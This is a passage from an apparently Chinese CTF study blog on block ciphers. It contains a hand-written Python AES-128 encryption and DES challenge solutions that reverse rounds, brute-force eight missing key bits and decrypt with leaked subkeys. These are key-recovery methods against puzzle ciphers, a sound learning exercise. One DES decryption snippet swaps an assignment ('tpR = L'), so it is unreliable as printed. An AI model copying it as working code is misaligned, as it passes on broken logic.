lazyload></a></li><li><strong>SubBytes字节替换</strong><br>这里引入一个S盒，然后进行S盒替换</li><li><strong>ShiftRows行位移变换</strong><br>这也是一次扩散处理，达到雪崩效应（雪崩效应是指当输入发生最微小的改变（例如，反转一个二进制位）时，也会导致输出的不可区分性改变，即扩大错误防止攻击者找到不同明密文之间的关系）。</li><li><strong>MixColumns列混合变换</strong><br>也是扩散操作</li><li><strong>子密钥生成</strong></li></ol><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">r_con = (<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>,<span class="number">0x80</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>)</span><br><span class="line">s_box = (</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line">    <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_bytes</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(i^j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_round_key</span>(<span class="params">s, k</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            s[i][j] ^= k[i][j]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_bytes</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            s[i][j] = s_box[s[i][j]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_rows</span>(<span class="params">s</span>):</span><br><span class="line">    s[<span class="number">0</span>][<span class="number">1</span>], s[<span class="number">1</span>][<span class="number">1</span>], s[<span class="number">2</span>][<span class="number">1</span>], s[<span class="number">3</span>][<span class="number">1</span>] = s[<span class="number">1</span>][<span class="number">1</span>], s[<span class="number">2</span>][<span class="number">1</span>], s[<span class="number">3</span>][<span class="number">1</span>], s[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">    s[<span class="number">0</span>][<span class="number">2</span>], s[<span class="number">1</span>][<span class="number">2</span>], s[<span class="number">2</span>][<span class="number">2</span>], s[<span class="number">3</span>][<span class="number">2</span>] = s[<span class="number">2</span>][<span class="number">2</span>], s[<span class="number">3</span>][<span class="number">2</span>], s[<span class="number">0</span>][<span class="number">2</span>], s[<span class="number">1</span>][<span class="number">2</span>]</span><br><span class="line">    s[<span class="number">0</span>][<span class="number">3</span>], s[<span class="number">1</span>][<span class="number">3</span>], s[<span class="number">2</span>][<span class="number">3</span>], s[<span class="number">3</span>][<span class="number">3</span>] = s[<span class="number">3</span>][<span class="number">3</span>], s[<span class="number">0</span>][<span class="number">3</span>], s[<span class="number">1</span>][<span class="number">3</span>], s[<span class="number">2</span>][<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参考 http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.c</span></span><br><span class="line">xtime = <span class="keyword">lambda</span> a: (((a &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1B</span>) &amp; <span class="number">0xFF</span>) <span class="keyword">if</span> (a &amp; <span class="number">0x80</span>) <span class="keyword">else</span> (a &lt;&lt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_single_column</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="comment"># see Sec 4.1.2 in The Design of Rijndael</span></span><br><span class="line">    t = a[<span class="number">0</span>] ^ a[<span class="number">1</span>] ^ a[<span class="number">2</span>] ^ a[<span class="number">3</span>]</span><br><span class="line">    u = a[<span class="number">0</span>]</span><br><span class="line">    a[<span class="number">0</span>] ^= t ^ xtime(a[<span class="number">0</span>] ^ a[<span class="number">1</span>])</span><br><span class="line">    a[<span class="number">1</span>] ^= t ^ xtime(a[<span class="number">1</span>] ^ a[<span class="number">2</span>])</span><br><span class="line">    a[<span class="number">2</span>] ^= t ^ xtime(a[<span class="number">2</span>] ^ a[<span class="number">3</span>])</span><br><span class="line">    a[<span class="number">3</span>] ^= t ^ xtime(a[<span class="number">3</span>] ^ u)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_columns</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        mix_single_column(s[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_expand_key</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        word = <span class="built_in">list</span>(s[-<span class="number">1</span>])  <span class="comment"># 取得最后一列</span></span><br><span class="line">        word.append(word.pop(<span class="number">0</span>)) <span class="comment"># 将首位移动到最后</span></span><br><span class="line">        word = [s_box[b] <span class="keyword">for</span> b <span class="keyword">in</span> word]  <span class="comment"># SubBytes操作</span></span><br><span class="line">        word[<span class="number">0</span>] ^= r_con[i]  <span class="comment"># 和异或表内数据异或</span></span><br><span class="line"></span><br><span class="line">        s.append(xor_bytes(word, s[-<span class="number">4</span>]))  <span class="comment"># 得到新的子密钥</span></span><br><span class="line">        s.append(xor_bytes(s[-<span class="number">1</span>], s[-<span class="number">4</span>]))  <span class="comment"># 因为直接在s中添加，所以本该和上一轮第二列异或的位置还是-4</span></span><br><span class="line">        s.append(xor_bytes(s[-<span class="number">1</span>], s[-<span class="number">4</span>]))</span><br><span class="line">        s.append(xor_bytes(s[-<span class="number">1</span>], s[-<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [s[<span class="number">4</span>*i : <span class="number">4</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s) // <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes2matrix</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Converts a 16-byte array into a 4x4 matrix.  &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">list</span>(text[i:i+<span class="number">4</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;1234567812345678&#x27;</span></span><br><span class="line">plain = <span class="string">b&#x27;1234567812345678&#x27;</span></span><br><span class="line">skeys = _expand_key(bytes2matrix(key))</span><br><span class="line">plain = bytes2matrix(plain)</span><br><span class="line"></span><br><span class="line">add_round_key(plain, skeys[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    sub_bytes(plain)</span><br><span class="line">    shift_rows(plain)</span><br><span class="line">    mix_columns(plain)</span><br><span class="line">    add_round_key(plain, skeys[i])</span><br><span class="line"></span><br><span class="line">sub_bytes(plain)</span><br><span class="line">shift_rows(plain)</span><br><span class="line">add_round_key(plain, skeys[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>(plain[<span class="number">0</span>]+plain[<span class="number">1</span>]+plain[<span class="number">2</span>]+plain[<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(enc)  <span class="comment"># b&#x27;m\xac\x1cV\xe7G\xfa\xe0:\xcf\x8ch\x91\xe4(\xe0&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="封装库实现-1"><a href="#封装库实现-1" class="headerlink" title="封装库实现"></a>封装库实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b&#x27;1234567812345678&#x27;</span></span><br><span class="line">plain = <span class="string">b&#x27;1234567812345678&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">enc = cipher.encrypt(plain)</span><br><span class="line"><span class="built_in">print</span>(enc)  </span><br></pre></td></tr></table></figure><h2 id="P1-DES-解密"><a href="#P1-DES-解密" class="headerlink" title="P1 DES 解密"></a>P1 DES 解密</h2><p>知识点：DES的F函数可逆，改变一点就可以</p><ol><li><p>无需关注F函数实现，查看16轮迭代</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L, R = block[:<span class="number">32</span>], block[<span class="number">32</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    tpR = R[:]</span><br><span class="line">    R = F(i, R, skeys)</span><br><span class="line">    R = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, R, L))</span><br><span class="line">    L = tpR</span><br></pre></td></tr></table></figure><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230806114145135.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230806114145135.png"  class="" lazyload></a></li><li><p>代码实现，将代码逆过来即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">​```</span><br><span class="line"><span class="number">1.</span> 先IP置换函数</span><br><span class="line"><span class="number">2.</span> 十六轮逆过程</span><br><span class="line"><span class="number">3.</span> FP置换函数</span><br><span class="line">​```</span><br><span class="line"><span class="comment"># 加密代码</span></span><br><span class="line">L, R = block[:<span class="number">32</span>], block[<span class="number">32</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    tpR = R[:]</span><br><span class="line">    R = F(i, R, skeys)</span><br><span class="line">    R = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, R, L))</span><br><span class="line">    L = tpR</span><br><span class="line"><span class="comment"># 解密代码</span></span><br><span class="line">L, R = block[:<span class="number">32</span>], block[<span class="number">32</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    tpR = R[:]</span><br><span class="line">    R = F(i, R, skeys)</span><br><span class="line">    R = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, R, L))</span><br><span class="line">    tpR = L</span><br></pre></td></tr></table></figure></li></ol><h2 id="P2-DES-无密钥"><a href="#P2-DES-无密钥" class="headerlink" title="P2 DES 无密钥"></a>P2 DES 无密钥</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">F</span>(<span class="params">index: <span class="built_in">int</span>, R: <span class="type">List</span>[<span class="built_in">int</span>], skeys: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>):</span><br><span class="line">    R = EP(R)  <span class="comment"># 扩展置换</span></span><br><span class="line"><span class="comment"># 比较代码没有和子密钥进行异或 直接进行解密</span></span><br><span class="line"><span class="comment"># R = list(map(lambda x, y: x ^ y, R, skeys[index]))  # 异或</span></span><br><span class="line">B = [R[:<span class="number">6</span>], R[<span class="number">6</span>:<span class="number">12</span>], R[<span class="number">12</span>:<span class="number">18</span>], R[<span class="number">18</span>:<span class="number">24</span>], R[<span class="number">24</span>:<span class="number">30</span>], R[<span class="number">30</span>:<span class="number">36</span>], R[<span class="number">36</span>:<span class="number">42</span>], R[<span class="number">42</span>:]]  <span class="comment"># 分成八份</span></span><br></pre></td></tr></table></figure><h2 id="P3-DES-密钥爆破"><a href="#P3-DES-密钥爆破" class="headerlink" title="P3 DES 密钥爆破"></a>P3 DES 密钥爆破</h2><p>给出L和R和C R缺8位 爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">L = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">R = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"><span class="string">b&#x27;\x1d\xe8\xd1\xc8\x95&#123;]\xa0&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    R = RR +<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)))</span><br><span class="line">    skeys = get_sub_key(LL, R)</span><br><span class="line">    block = IP(enc)   </span><br><span class="line">    L, R = block[:<span class="number">32</span>], block[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        tpR = R[:]</span><br><span class="line">        R = F(i, R, skeys)</span><br><span class="line">        R = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x ^ y, R, L))</span><br><span class="line">        L = tpR</span><br><span class="line">    block = R + L</span><br><span class="line">    block = FP(block)</span><br><span class="line">    plain = <span class="built_in">bytes</span>([<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, block[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>])), <span class="number">2</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">    flag = <span class="string">b&#x27;NSSCTF&#123;%s&#125;&#x27;</span> % (plain)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="P4-DES-Kn泄露"><a href="#P4-DES-Kn泄露" class="headerlink" title="P4 DES Kn泄露"></a>P4 DES Kn泄露</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line">enc = <span class="string">b&#x27;3\xb3\xdc\xbfkg\x1b\xceG!\x08\x16\xf6i\x0c\xbd\xde_\xe7#\xe2\x99\xe7\xf0\xd9\x02\xd6Hi=1=&#x27;</span></span><br><span class="line">Kn = [```]</span><br><span class="line">des = pyDes.des(<span class="string">&#x27;11111111&#x27;</span>, padmode=pyDes.PAD_PKCS5)</span><br><span class="line">des.Kn = Kn</span><br><span class="line"><span class="built_in">print</span>(des.decrypt(enc))</span><br></pre></td></tr></table></figure><h2 id="P4-DES-Kn泄露-子密钥算法逆向"><a href="#P4-DES-Kn泄露-子密钥算法逆向" class="headerlink" title="P4 DES Kn泄露  子密钥算法逆向"></a>P4 DES Kn泄露  子密钥算法逆向</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&#x27;\xed\xb7H\xa8zL\xb5\xff\xb2g\x1c&lt;\x17G^\xda\xd4\xb2\x84X\xb4\x92\x18I\xaf9\xcd\xce\xc1\x182&quot;&#x27;</span></span><br><span class="line">Kn = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, 